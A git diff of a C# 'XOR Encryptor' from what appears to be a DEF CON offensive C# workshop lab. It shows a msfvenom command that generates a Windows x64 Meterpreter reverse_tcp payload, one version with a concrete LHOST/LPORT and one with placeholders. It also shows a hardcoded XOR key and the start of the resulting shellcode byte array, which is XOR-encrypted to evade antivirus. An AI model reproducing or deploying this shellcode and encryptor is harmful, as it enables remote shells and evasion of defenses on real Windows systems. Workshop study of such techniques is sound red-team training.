@@ -1,8 +1,8 @@
-// XOR Encryptor courtesy of Mauricio Velazco available here https://raw.githubusercontent.com/mvelazc0/defcon27_csharp_workshop/master/Labs/lab4/1.cs
+// XOR Encryptor
+// https://raw.githubusercontent.com/mvelazc0/defcon27_csharp_workshop/master/Labs/lab4/1.cs
 using System;
 using System.IO;
 using System.Text;
-
 
 public class Program
 {
@@ -25,7 +25,7 @@ public class Program
         // The string value for the key is used to encrypt the shellcode
 		string key = "MROBOTX";
 		
-		// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.1.1.15 LPORT=8080 EXITFUNC=thread -f csharp
+		// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp
  byte[] shellcode = new byte[511] {
              0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
              0x51,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x56,0x48,
